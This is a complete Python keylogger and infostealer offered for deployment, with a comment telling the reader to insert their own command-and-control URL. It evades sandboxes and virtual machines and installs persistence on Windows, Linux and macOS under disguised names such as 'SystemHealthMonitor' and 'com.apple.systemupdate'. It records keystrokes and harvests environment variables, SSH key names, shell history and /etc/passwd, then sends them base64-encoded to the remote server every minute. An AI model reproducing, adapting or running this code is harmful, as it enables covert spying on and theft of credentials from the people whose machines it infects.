#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import json
import time
import base64
import threading
import platform
import requests
from pynput import keyboard
from cryptography.fernet import Fernet

# --- CONFIGURATION (REPLACE WITH YOUR C2 SERVER) ---
C2_URL = "https://your-c2-server.com/exfil"
PERSISTENCE_MECHANISMS = True
ANTI_ANALYSIS = True
EXFIL_INTERVAL = 60  # Seconds

# --- GLOBAL VARIABLES ---
LOG_FILE = os.path.join(os.environ["TEMP"] if platform.system() == "Windows" else "/tmp", ".system_report")
SYS_ID = Fernet.generate_key().decode()
KEYS_PRESSED = []

# --- ANTIDEBUG TECHNIQUES ---
def _detect_analysis_environment():
    if not ANTI_ANALYSIS:
        return False
    
    # Check for virtualization/sandbox artifacts
    analysis_indicators = [
        "vmbox", "vmware", "virtualbox", "qemu", "xen",
        "sandbox", "malware", "debug", "wireshark", "procmon"
    ]
    
    try:
        # Check processes
        processes = os.popen('ps aux' if platform.system() != "Windows" else 'tasklist').read().lower()
        if any(indicator in processes for indicator in analysis_indicators):
            return True
        
        # Check MAC addresses of virtual adapters
        mac_vendors = ["08:00:27", "00:05:69", "00:0c:29", "00:1c:14"]
        if any(mac in open('/sys/class/net/eth0/address').read() if platform.system() != "Windows" else 
               os.popen('getmac').read().lower() for mac in mac_vendors):
            return True
            
        # Check system uptime (sandboxes often have short uptimes)
        if time.time() - os.stat('/proc/uptime' if platform.system() != "Windows" else 
                                os.path.join(os.environ["WINDIR"], "win.ini")).st_ctime < 300:
            return True
            
    except:
        pass
    
    return False

# --- PERSISTENCE MECHANISMS ---
def _establish_persistence():
    if not PERSISTENCE_MECHANISMS:
        return
    
    try:
        if platform.system() == "Windows":
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "SystemHealthMonitor", 0, winreg.REG_SZ, sys.executable)
        elif platform.system() == "Linux":
            cron_entry = f"@reboot {sys.executable} {__file__}"
            os.system(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -')
        elif platform.system() == "Darwin":
            launchd_plist = f'''<?xml version="1.0" encoding="UTF-8"?>
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.apple.systemupdate</string>
                <key>ProgramArguments</key>
                <array>
                    <string>{sys.executable}</string>
                    <string>{__file__}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
            </dict>
            </plist>'''
            with open(os.path.expanduser("~/Library/LaunchAgents/com.apple.systemupdate.plist"), "w") as f:
                f.write(launchd_plist)
    except Exception as e:
        pass

# --- DATA COLLECTION MODULES ---
def _capture_system_info():
    system_profile = {
        "system_id": SYS_ID,
        "platform": platform.platform(),
        "username": os.getlogin(),
        "network": {
            "hostname": platform.node(),
            "ip_address": requests.get("https://api.ipify.org").text if not _detect_analysis_environment() else "N/A"
        },
        "environment": dict(os.environ),
        "sensitive_paths": {
            "ssh_keys": [f for f in os.listdir(os.path.expanduser("~/.ssh")) if f.endswith(".pub") or f.endswith("_rsa")],
            "bash_history": open(os.path.expanduser("~/.bash_history")).read()[-1000:] if platform.system() != "Windows" else None
        }
    }
    return system_profile

# --- KEYLOGGER IMPLEMENTATION ---
def _on_key_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        current_key = f" [{key.name}] "
    
    KEYS_PRESSED.append(current_key)
    if len(KEYS_PRESSED) > 100:
        _flush_keylog_buffer()

def _flush_keylog_buffer():
    global KEYS_PRESSED
    with open(LOG_FILE, "a") as f:
        f.write("".join(KEYS_PRESSED))
    KEYS_PRESSED = []

# --- DATA EXFILTRATION ---
def _exfiltrate_data():
    while True:
        try:
            # Package collected data
            payload = {
                "system_profile": _capture_system_info(),
                "keylog_data": open(LOG_FILE).read() if os.path.exists(LOG_FILE) else None,
                "additional_files": {
                    "etc_hosts": open("/etc/hosts").read() if platform.system() != "Windows" else None,
                    "passwd": open("/etc/passwd").read() if platform.system() != "Windows" else None
                }
            }
            
            # Obfuscate payload
            encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode()
            requests.post(C2_URL, data=encoded_payload, timeout=10)
            
            # Rotate log file
            if os.path.exists(LOG_FILE):
                os.remove(LOG_FILE)
            
        except Exception as e:
            pass
        
        time.sleep(EXFIL_INTERVAL)

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    if _detect_analysis_environment():
        sys.exit(0)
    
    # Hide console window (Windows only)
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    _establish_persistence()
    
    # Start keylogger thread
    keyboard_listener = keyboard.Listener(on_press=_on_key_press)
    keyboard_listener.start()
    
    # Start exfiltration thread
    exfil_thread = threading.Thread(target=_exfiltrate_data)
    exfil_thread.daemon = True
    exfil_thread.start()
    
    # Keep main thread alive
    while True:
        time.sleep(3600)
